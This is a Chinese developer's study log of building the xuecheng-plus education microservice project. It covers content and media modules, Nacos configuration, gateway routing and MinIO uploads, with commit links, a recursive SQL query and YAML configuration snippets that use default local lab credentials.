<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每一种类的工程都有不同的作用，下面是对其功能进行说明：</span><br><span class="line">•	父工程</span><br><span class="line">    ￮	对依赖包的版本进行管理 </span><br><span class="line">    ￮	本身为Pom工程，对子工程进行聚合管理 </span><br><span class="line">    </span><br><span class="line">•	基础工程</span><br><span class="line">    ￮	继承父类工程</span><br><span class="line">    ￮	提供基础类库</span><br><span class="line">    ￮	提供工具类库</span><br><span class="line"></span><br><span class="line">•	微服务工程</span><br><span class="line">    ￮	分别从业务、技术方面划分模块，每个模块构建为一个微服务。</span><br><span class="line">    ￮	每个微服务工程依赖基础工程，间接继承父工程。</span><br><span class="line">    ￮	包括：内容管理服务、媒资管理服务、搜索服务、订单支付服务等。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建父工程（只留下pom.xml），对应commit:<a href="https://github.com/realikun404/xuecheng-plus-project/commit/be0a4d9e93b96cd3f65c39693fab80bffa103bf4">构建父工程 · realikun404&#x2F;xuecheng-plus-project@be0a4d9 (github.com)</a></p>
<p>初始化base工程，对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/6f423976687d96826c97e10ad3f16b11e2bd8ed2">初始化xuecheng-plus-base模块 · realikun404&#x2F;xuecheng-plus-project@6f42397 (github.com)</a></p>
<h1 id="内容管理模块"><a href="#内容管理模块" class="headerlink" title="内容管理模块"></a>内容管理模块</h1><p>创建xuecheng_content表，sql文件内容为下面commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/25655d2ed689d29085e560649bb5c2337dfc9613">创建xc_content数据表，这是初始化对应的sql文件 · realikun404&#x2F;xuecheng-plus-project@25655d2 (github.com)</a></p>
<h2 id="模块需求分析"><a href="#模块需求分析" class="headerlink" title="模块需求分析"></a>模块需求分析</h2><p>需求规格说明书例子：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240925093928486.png" alt="image-20240925093928486"></p>
<p>内容管理及其子模块之间的关系：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240925101530155.png" alt="image-20240925101530155"></p>
<p>然后初始化了content模块，其下面还有子模块，对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/474161655482adc043ebc9a8cb9c9ab99800c178">content工程模块创建（学到了maven依赖管理） · realikun404&#x2F;xuecheng-plus-project@4741616 (github.com)</a></p>
<h2 id="课程查询"><a href="#课程查询" class="headerlink" title="课程查询"></a>课程查询</h2><h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><p>1、查询条件：</p>
<p>包括：课程名称、课程审核状态、课程发布状态</p>
<p>课程名称：可以模糊搜索</p>
<p>课程审核状态：未提交、已提交、审核通过、审核未通过</p>
<p>课程发布状态：未发布、已发布、已下线</p>
<p>因为是分页查询所以查询条件中还要包括当前页码、每页显示记录数。</p>
<p>2、查询结果：</p>
<p>查询结果中包括：课程id、课程名称、任务数、创建时间、是否付费、审核状态、类型，操作</p>
<p>任务数：该课程所包含的课程计划数，即课程章节数。</p>
<p>是否付费：课程包括免费、收费两种。</p>
<p>类型：录播、直播。</p>
<p>因为是分页查询所以查询结果中还要包括总记录数、当前页、每页显示记录数。</p>
<h3 id="创建数据库表及PO类型"><a href="#创建数据库表及PO类型" class="headerlink" title="创建数据库表及PO类型"></a>创建数据库表及PO类型</h3><p>本项目使用mybatis-plus的generator工程生成PO类、Mapper接口、Mapper的xml文件，地址在：<a href="https://github.com/baomidou/generator">https://github.com/baomidou/generator</a></p>
<p>添加生成器代码commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/8d8a1009d029c4c8ece3ef9b645c6575fff1b04d">添加生成器代码 · realikun404&#x2F;xuecheng-plus-project@8d8a100 (github.com)</a></p>
<p>添加对应po类，及修改pom文件：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/620641fba466b82798ae21e3b2b9a866c49ca30d">添加content的po类 · realikun404&#x2F;xuecheng-plus-project@620641f (github.com)</a></p>
<p>编写配置文件、通用类commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/84a7b57c0efa430d47c9bc602f99a68b9d5c34ca">content工程模块编写通用返回类，通用接收类。以及编写log4j配置文件log4j-dev-xml和spring-cloud的boot… · realikun404&#x2F;xuecheng-plus-project@84a7b57 (github.com)</a></p>
<p>springcloud 配置文件讲解：<a href="https://blog.csdn.net/qq_62923382/article/details/131876919">聊聊开发中常见几种Spring Cloud Config 的配置文件bootstrap.yml、bootstrap-dev.yml 和 bootstrap-prod.yml-CSDN博客</a></p>
<p>swagger相关代码，使用swagger可以进行快速测试、看接口的参数、返回：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/008c160af13ca8303e00bbc9da3bc77254e353b1">swagger相关配置 · realikun404&#x2F;xuecheng-plus-project@008c160 (github.com)</a></p>
<p>时间格式统一设置为yyyy-MM-dd HH:mm:ss，Jackson2ObjectMapperBuilderCustomizer 开启全局默认类型：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/5bed7cfeb6daf23b0c5a1244be8a362d13cba123">统一设置时间格式为yyyy-MM-dd HH:mm:ss · realikun404&#x2F;xuecheng-plus-project@5bed7cf (github.com)</a></p>
<p>启动类放错包了，重新放下：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/dfc0a25784e0a4406fc70a8f1c8a1f0793a1924c">启动类放错位置了得放在com.xuecheng下，之前是放在com.xuecheng.content。放在com.xuecheng.con… · realikun404&#x2F;xuecheng-plus-project@dfc0a25 (github.com)</a></p>
<h3 id="开发持久层"><a href="#开发持久层" class="headerlink" title="开发持久层"></a>开发持久层</h3><p>使用之前mybatis-plus的generator工程生成的Mapper接口，放在对应包下：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/182572586ff47b3ba9f2baa7d7b025af1ea638ad">使用之前生成的mapper文件放在com.xuecheng.content.mapper下 · realikun404&#x2F;xuecheng-plus-project@1825725 (github.com)</a></p>
<p>编写对应的测试代码（mybatis插件、mapper扫描）：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/e3a22dd5cac178b3a99ba369d9bbd579a4354795">编写测试文件，需要修改mybatis-plus-boot-starter.version为3.5.3 · realikun404&#x2F;xuecheng-plus-project@e3a22dd (github.com)</a>  参考：<a href="https://blog.csdn.net/jackwei1014/article/details/131049338">MyBatis-Plus 引入依赖导致的Error creating bean和java.lang.NoClassDefFoundError: com&#x2F;baomidou&#x2F;mybatisplus问题_com.baomidou.mybatisplus.core.handlers.annotationh-CSDN博客</a></p>
<h3 id="开发业务层"><a href="#开发业务层" class="headerlink" title="开发业务层"></a>开发业务层</h3><p>数据字典表：</p>
<p>commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/acb2c01248c291c77b3c61835d22af4f33eab81d">数据字典处理 · realikun404&#x2F;xuecheng-plus-project@acb2c01 (github.com)</a></p>
<p>参考：<a href="https://blog.csdn.net/weixin_43180484/article/details/109527556">数据库设计之数据字典的使用与设计_数据字典设计-CSDN博客</a></p>
<p>编写service及其test：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/dc8c2bd05ed23298cfcb10c47de2d9712bb5281b">编写课程查询service及test · realikun404&#x2F;xuecheng-plus-project@dc8c2bd (github.com)</a></p>
<h3 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h3><p>接口完善：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/d1d0417f126ca56d6a5cce1851de0a35f46bbf3c">接口完善（使用swagger测试） · realikun404&#x2F;xuecheng-plus-project@d1d0417 (github.com)</a></p>
<p>httpClient插件安装及其对应使用：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/e02a28d1dbf57393162191628681cf8d3af1ab24">httpClient插件安装及其对应使用 · realikun404&#x2F;xuecheng-plus-project@e02a28d (github.com)</a></p>
<h3 id="前后端联调"><a href="#前后端联调" class="headerlink" title="前后端联调"></a>前后端联调</h3><p>npm run serve出现问题，解决方法：<a href="https://blog.csdn.net/sunyctf/article/details/128504897">如何解决npm run serve运行vue项目时，出现报错：Error: error:0308010C:digital envelope routines::unsupported_library: ‘digital envelope routines’,-CSDN博客</a></p>
<p>导入system模块，修改配置文件。修改mybatis-plus版本：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/ec4b5a56e1c1ca71fe909b2abb386a586e2c6a1d">导入system模块，修改配置文件。修改mybatis-plus版本 · realikun404&#x2F;xuecheng-plus-project@ec4b5a5 (github.com)</a></p>
<p>解决跨域问题，加个CorsFilter（也可以使用<a href="https://www.jianshu.com/p/898fbfa9c359">前端跨域解决 （vscode live server proxy 代理） - 简书 (jianshu.com)</a>）：</p>
<p>参考：<a href="https://blog.csdn.net/sfh2018/article/details/116594698">【SpringBoot】SpringBoot配置CORS跨域和遇到的问题_defaultcorsfilter-CSDN博客</a></p>
<p>commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/a8ffed342047a82037f48b95c9faab148d8e9bd0">使用Filter过滤器进行配置解决跨域问题 · realikun404&#x2F;xuecheng-plus-project@a8ffed3 (github.com)</a></p>
<p>微服务要启动很多应用，设置下service窗口，这样好操作</p>
<h2 id="课程分类查询"><a href="#课程分类查询" class="headerlink" title="课程分类查询"></a>课程分类查询</h2><h3 id="接口定义"><a href="#接口定义" class="headerlink" title="接口定义"></a>接口定义</h3><p>commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/55c46a3125a6875c07bf0461fffe7e2731cd0f45">课程分类查询接口定义 · realikun404&#x2F;xuecheng-plus-project@55c46a3 (github.com)</a></p>
<h3 id="接口开发"><a href="#接口开发" class="headerlink" title="接口开发"></a>接口开发</h3><p><a href="https://blog.csdn.net/w13966597931/article/details/133221384">一篇文章成为递归大神：MySQL递归查询（with recursive）-CSDN博客</a></p>
<p> 本项目例子：</p>
<p>向下递归</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">recursive</span> t1 <span class="keyword">as</span> (</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>  course_category p <span class="keyword">where</span>  id<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"> <span class="keyword">select</span> t.<span class="operator">*</span> <span class="keyword">from</span> course_category t <span class="keyword">inner</span> <span class="keyword">join</span> t1 <span class="keyword">on</span> t1.id <span class="operator">=</span> t.parentid</span><br><span class="line">)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span>  <span class="keyword">from</span> t1 <span class="keyword">order</span> <span class="keyword">by</span> t1.id, t1.orderby</span><br></pre></td></tr></table></figure>

<p>流程：自定义mapper、xml文件写具体sql语句、编写测试代码</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/691106c39dee3d00274048b4ace2cd1b4365dfd5">课程分类查询接口完善及测试 · realikun404&#x2F;xuecheng-plus-project@691106c (github.com)</a></p>
<h2 id="新增课程"><a href="#新增课程" class="headerlink" title="新增课程"></a>新增课程</h2><h3 id="接口定义-1"><a href="#接口定义-1" class="headerlink" title="接口定义"></a>接口定义</h3><p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/9eca7b3d840ef61b49203d3df1084e93d9633888">完善新增课程接口定义 · realikun404&#x2F;xuecheng-plus-project@9eca7b3 (github.com)</a></p>
<h3 id="接口开发-amp-测试"><a href="#接口开发-amp-测试" class="headerlink" title="接口开发&amp;测试"></a>接口开发&amp;测试</h3><p>增删改的方法都要加@Transactional注解。</p>
<p>传入参数合法校验</p>
<p>对应commit：</p>
<p><a href="https://github.com/realikun404/xuecheng-plus-project/commit/a8692f63dd77529a5649a49f5f0c4977572a9529">开发新增课程接口 · realikun404&#x2F;xuecheng-plus-project@a8692f6 (github.com)</a></p>
<p><a href="https://github.com/realikun404/xuecheng-plus-project/commit/720ccf8a07d047d2760fce1801865a3a2e3c7fb1">完善新增课程接口 · realikun404&#x2F;xuecheng-plus-project@720ccf8 (github.com)</a></p>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p><a href="https://blog.csdn.net/user2025/article/details/105458842">SpringBoot常用注解@RestControllerAdvice-CSDN博客</a></p>
<p>继承RuntimeException类自定义异常类、编写自定义异常处理器:<a href="https://github.com/realikun404/xuecheng-plus-project/commit/cb30466f161d8a061290291e190e8e650e2ea38b">编写异常处理相关代码 · realikun404&#x2F;xuecheng-plus-project@cb30466 (github.com)</a></p>
<h3 id="JSR303校验"><a href="#JSR303校验" class="headerlink" title="JSR303校验"></a>JSR303校验</h3><p><a href="https://blog.csdn.net/qq_41712834/article/details/106886410">Spring Boot 使用 JSR303（@Validated） 实现参数校验_掌握spring掌握jsr303验证的心得-CSDN博客</a></p>
<p>JSR校验、全局异常处理、分组校验</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/11c799ca50299f7d761fa62190860e3f24f2c1ef">JSR303校验相关代码实现 · realikun404&#x2F;xuecheng-plus-project@11c799c (github.com)</a></p>
<h2 id="修改课程接口"><a href="#修改课程接口" class="headerlink" title="修改课程接口"></a>修改课程接口</h2><p>之前有个小bug。应该修改mtName修改成了mt，应该修改stName修改成了st。一起commit</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/39e252d2e34f18e5aa6b63a3c46a1ad4a1e3055f">课程修改接口实现+bug fix · realikun404&#x2F;xuecheng-plus-project@39e252d (github.com)</a></p>
<h3 id="查询课程计划-amp-新增课程计划"><a href="#查询课程计划-amp-新增课程计划" class="headerlink" title="查询课程计划&amp;新增课程计划"></a>查询课程计划&amp;新增课程计划</h3><p><a href="https://blog.csdn.net/d34588/article/details/112602175">Mybatis中使用association进行关联的几种方式_mybatis在注解使用association-CSDN博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/572129887">MyBatis之ResultMap的association和collection标签详解 - 知乎 (zhihu.com)</a></p>
<p>相关表-teachPlan</p>
<p>设计树形结构、排序</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/8b1fdf6db9892cf3b76c62893c74ec23db2ba555">课程计划查询&amp;新增课程计划实现 · realikun404&#x2F;xuecheng-plus-project@8b1fdf6 (github.com)</a></p>
<h1 id="媒资管理模块"><a href="#媒资管理模块" class="headerlink" title="媒资管理模块"></a>媒资管理模块</h1><h2 id="搭建nacos环境"><a href="#搭建nacos环境" class="headerlink" title="搭建nacos环境"></a>搭建nacos环境</h2><h3 id="服务发现中心"><a href="#服务发现中心" class="headerlink" title="服务发现中心"></a>服务发现中心</h3><p><a href="https://nacos.io/zh-cn/docs/quick-start.html#:~:text=Nacos">Nacos 快速开始</a></p>
<p><a href="https://developer.aliyun.com/article/848208">微服务的灵魂摆渡者——Nacos，来一篇原理全攻略-阿里云开发者社区 (aliyun.com)</a></p>
<p><a href="https://blog.csdn.net/liuerchong/article/details/110855626">Spring Cloud Alibaba Nacos Discovery 组件介绍_spring-cloud-starter-alibaba-nacos-discovery-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/u010520146/article/details/118703413">nacos-config配置中心、多环境配置、加载多配置文件_nacos做配置中心,公共配置,多环境配置-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/z69183787/article/details/109467120">SpringCloud 使用 nacos配置中心，nacos属性值自动刷新_refresh-enabled-CSDN博客</a></p>
<p>使用docker起的nacos：192.168.101.65:8848&#x2F;nacos 账号：nacos 密码：nacos</p>
<p>在nacos新增命名空间dev-402</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;$&#123;spring-cloud-alibaba.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">    &lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<h3 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h3><p>先将项目中的配置文件分分类：</p>
<p>1、每个项目特有的配置</p>
<p>是指该配置只在有些项目中需要配置，或者该配置在每个项目中配置的值不同。</p>
<p>比如：spring.application.name每个项目都需要配置但值不一样，以及有些项目需要连接数据库而有些项目不需要，有些项目需要配置消息队列而有些项目不需要。</p>
<p>2、项目所公用的配置</p>
<p>是指在若干项目中配置内容相同的配置。比如：redis的配置，很多项目用的同一套redis服务所以配置也一样。</p>
<p>另外还需要知道nacos如何去定位一个具体的配置文件，即：namespace、group、dataid. </p>
<p>1、通过namespace、group找到具体的环境和具体的项目。</p>
<p>2、通过dataid找到具体的配置文件，dataid有三部分组成</p>
<p>比如：content-service-dev.yaml配置文件 由（content-service）-（dev）. (yaml)三部分组成</p>
<p>content-service：第一部分，它是在application.yaml中配置的应用名，即spring.application.name的值。</p>
<p>dev：第二部分，它是环境名，通过spring.profiles.active指定，</p>
<p>Yaml: 第三部分，它是配置文件 的后缀，目前nacos支持properties、yaml等格式类型，本项目选择yaml格式类型。</p>
<p>所以，如果我们要配置content-service工程的配置文件:</p>
<p>在开发环境中配置content-service-dev.yaml</p>
<p>在测试环境中配置content-service-test.yaml</p>
<p>在生产环境中配置content-service-prod.yaml</p>
<p>我们启动项目中传入spring.profiles.active的参数决定引用哪个环境的配置文件，例如：传入spring.profiles.active&#x3D;dev表示使用dev环境的配置文件即content-service-dev.yaml。</p>
<h3 id="配置了content-api"><a href="#配置了content-api" class="headerlink" title="配置了content-api"></a>配置了content-api</h3><p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/a10d2e7a9ad91ba4672421f1866a3eaba616210d">nacos配置了conctnt-api · realikun404&#x2F;xuecheng-plus-project@a10d2e7 (github.com)</a></p>
<h3 id="配置content-service"><a href="#配置content-service" class="headerlink" title="配置content-service"></a>配置content-service</h3><p>content-api引用content-service配置</p>
<p>对应commit：</p>
<p>配置优先级、导入配置</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/0c0f81ef15b3f22a2ecc20660be160f6cc50127b">nacos配置了conctnt-service · realikun404&#x2F;xuecheng-plus-project@0c0f81e (github.com)</a></p>
<h3 id="配置优先级"><a href="#配置优先级" class="headerlink" title="配置优先级"></a>配置优先级</h3><p>项目应用名配置文件 &gt; 扩展配置文件 &gt; 共享配置文件 &gt; 本地配置文件</p>
<p>如果想要本地配置优先（开发环境下）：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"> <span class="attr">cloud:</span></span><br><span class="line">  <span class="attr">config:</span></span><br><span class="line">    <span class="attr">override-none:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>之后导入给的nacos配置文件</p>
<h2 id="搭建Gateway"><a href="#搭建Gateway" class="headerlink" title="搭建Gateway"></a>搭建Gateway</h2><p>放在nacos的配置内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">63010</span> <span class="comment"># 网关端口</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line"><span class="comment">#      filter:</span></span><br><span class="line"><span class="comment">#        strip-prefix:</span></span><br><span class="line"><span class="comment">#          enabled: true</span></span><br><span class="line">      <span class="attr">routes:</span> <span class="comment"># 网关路由配置</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">content-api</span> <span class="comment"># 路由id，自定义，只要唯一即可</span></span><br><span class="line">          <span class="comment"># uri: http://127.0.0.1:8081 # 路由的目标地址 http就是固定地址</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://content-api</span> <span class="comment"># 路由的目标地址 lb就是负载均衡，后面跟服务名称</span></span><br><span class="line">          <span class="attr">predicates:</span> <span class="comment"># 路由断言，也就是判断请求是否符合路由规则的条件</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/content/**</span> <span class="comment"># 这个是按照路径匹配，只要以/content/开头就符合要求</span></span><br><span class="line"><span class="comment">#          filters:</span></span><br><span class="line"><span class="comment">#            - StripPrefix=1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">system-api</span></span><br><span class="line">          <span class="comment"># uri: http://127.0.0.1:8081</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://system-api</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/system/**</span></span><br><span class="line"><span class="comment">#          filters:</span></span><br><span class="line"><span class="comment">#            - StripPrefix=1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">media-api</span></span><br><span class="line">          <span class="comment"># uri: http://127.0.0.1:8081</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://media-api</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/media/**</span></span><br><span class="line"><span class="comment">#          filters:</span></span><br><span class="line"><span class="comment">#            - StripPrefix=1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">search-service</span></span><br><span class="line">          <span class="comment"># uri: http://127.0.0.1:8081</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://search</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/search/**</span></span><br><span class="line"><span class="comment">#          filters:</span></span><br><span class="line"><span class="comment">#            - StripPrefix=1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">auth-service</span></span><br><span class="line">          <span class="comment"># uri: http://127.0.0.1:8081</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://auth-service</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/auth/**</span></span><br><span class="line"><span class="comment">#          filters:</span></span><br><span class="line"><span class="comment">#            - StripPrefix=1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">checkcode</span></span><br><span class="line">          <span class="comment"># uri: http://127.0.0.1:8081</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://checkcode</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/checkcode/**</span></span><br><span class="line"><span class="comment">#          filters:</span></span><br><span class="line"><span class="comment">#            - StripPrefix=1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">learning-api</span></span><br><span class="line">          <span class="comment"># uri: http://127.0.0.1:8081</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://learning-api</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/learning/**</span></span><br><span class="line"><span class="comment">#          filters:</span></span><br><span class="line"><span class="comment">#            - StripPrefix=1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">orders-api</span></span><br><span class="line">          <span class="comment"># uri: http://127.0.0.1:8081</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://orders-api</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/orders/**</span></span><br><span class="line"><span class="comment">#          filters:</span></span><br><span class="line"><span class="comment">#            - StripPrefix=1</span></span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/685c180b8d46aa8069a7e3397e9f33d1253e990a">配置网关 · realikun404&#x2F;xuecheng-plus-project@685c180 (github.com)</a></p>
<h2 id="搭建媒资工程"><a href="#搭建媒资工程" class="headerlink" title="搭建媒资工程"></a>搭建媒资工程</h2><p>导入相关对应文件。对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/88d80163a82b876306ca5fe0ed9c75b9ba464246">导入媒资工程 · realikun404&#x2F;xuecheng-plus-project@88d8016 (github.com)</a></p>
<h2 id="MinIO"><a href="#MinIO" class="headerlink" title="MinIO"></a>MinIO</h2><p>项目采用MinIO构建分布式文件系统，MinIO 是一个非常轻量的服务,可以很简单的和其他应用的结合使用，它兼容亚马逊 S3 云存储服务接口，非常适合于存储大容量非结构化的数据，例如图片、视频、日志文件、备份数据和容器&#x2F;虚拟机镜像等。</p>
<p>它一大特点就是轻量，使用简单，功能强大，支持各种平台，单个文件最大5TB，兼容 Amazon S3接口，提供了 Java、Python、GO等多版本SDK支持。</p>
<p>官网：<a href="https://min.io/">https://min.io</a></p>
<p>中文：<a href="https://www.minio.org.cn/%EF%BC%8Chttp://docs.minio.org.cn/docs/">https://www.minio.org.cn/，http://docs.minio.org.cn/docs/</a></p>
<p>MinIO集群采用去中心化共享架构，每个结点是对等关系，通过Nginx可对MinIO进行负载均衡访问。</p>
<p><a href="https://blog.csdn.net/weixin_42636552/article/details/109035895">IOUtils快速进行内容复制与常用方法_ioutils.copy-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/lzx1991610/article/details/100654815#:~:text=%E6%9C%80%E8%BF%91%E6%9C%89%E4%B8%AA%E9%9C%80%E6%B1%82">Spring的加密工具类—DigestUtils-CSDN博客</a></p>
<p>minIO地址192.168.101.65:9001&#x2F;login 账号密码均为:minioadmin</p>
<p>测试上传文件、删除文件、下载文件commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/99365fda6ef6631c9e32d338a29ed2253a57e451">测试上传文件、删除文件、下载文件 · realikun404&#x2F;xuecheng-plus-project@99365fd (github.com)</a></p>
<h2 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h2><p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241007101831411.png" alt="image-20241007101831411"></p>
<p>媒资管理模块对资源统一管理、上传相同图片可以发现之前已经上传了</p>
<p>在nacos上的media-service-dev.yaml跟minIO及数据集相关相关内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://192.168.101.65:3306/xcplus_media?serverTimezone=UTC&amp;userUnicode=true&amp;useSSL=false&amp;</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">mysql</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">   <span class="attr">config:</span></span><br><span class="line">    <span class="attr">override-none:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">minio:</span></span><br><span class="line">  <span class="attr">endpoint:</span> <span class="string">http://192.168.101.65:9000</span></span><br><span class="line">  <span class="attr">accessKey:</span> <span class="string">minioadmin</span></span><br><span class="line">  <span class="attr">secretKey:</span> <span class="string">minioadmin</span></span><br><span class="line">  <span class="attr">bucket:</span></span><br><span class="line">    <span class="attr">files:</span> <span class="string">mediafiles</span></span><br><span class="line">    <span class="attr">videofiles:</span> <span class="string">video</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.jianshu.com/p/f78b43f048e6">RequestMapping 中produces 和 consumes - 简书 (jianshu.com)</a></p>
<p><code>MediaType.MULTIPART_FORM_DATA_VALUE</code> 是 Spring Framework 中的一个常量，它代表 <code>multipart/form-data</code> 这一媒体类型（MIME type）的字符串表示形式。在 HTTP 请求中，<code>multipart/form-data</code> 类型通常用于文件上传，它允许将文件的二进制数据和其他表单字段一起发送给服务器。</p>
<p>存储在buctket的地址根据年月日来放。</p>
<p>需要存文件到MinIO和对应信息到数据库</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/964c83a91ab91a1df8518f49fdf9ef243a6ab51a">上传图片代码完成 · realikun404&#x2F;xuecheng-plus-project@964c83a (github.com)</a></p>
<h2 id="上传图片-事务优化"><a href="#上传图片-事务优化" class="headerlink" title="上传图片-事务优化"></a>上传图片-事务优化</h2><p>有网络相关的地方，最好不要用事务（比如在函数传文件到minIO）</p>
<p>事务注解失效相关问题：调用事务的方法不是代理对象。</p>
<p>解决方法一般两个：1、自己注入自己调用。2、AopContext.currentProxy()</p>
<h2 id="上传视频"><a href="#上传视频" class="headerlink" title="上传视频"></a>上传视频</h2><h3 id="断点续传-测试代码编写"><a href="#断点续传-测试代码编写" class="headerlink" title="断点续传-测试代码编写"></a>断点续传-测试代码编写</h3><p><a href="https://blog.csdn.net/MarkerHub/article/details/129253226">SpringBoot分片上传、断点续传、大文件极速秒传功能，这篇都帮你搞定！（典藏版）…-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/b15735105314/article/details/115677912">Java IO——RandomAccessFile类详解-CSDN博客</a></p>
<p>通过分块进行实现</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/9e27617320636b86c00cb79b08b13e77dee91a3d">断点续传-测试代码编写 · realikun404&#x2F;xuecheng-plus-project@9e27617 (github.com)</a></p>
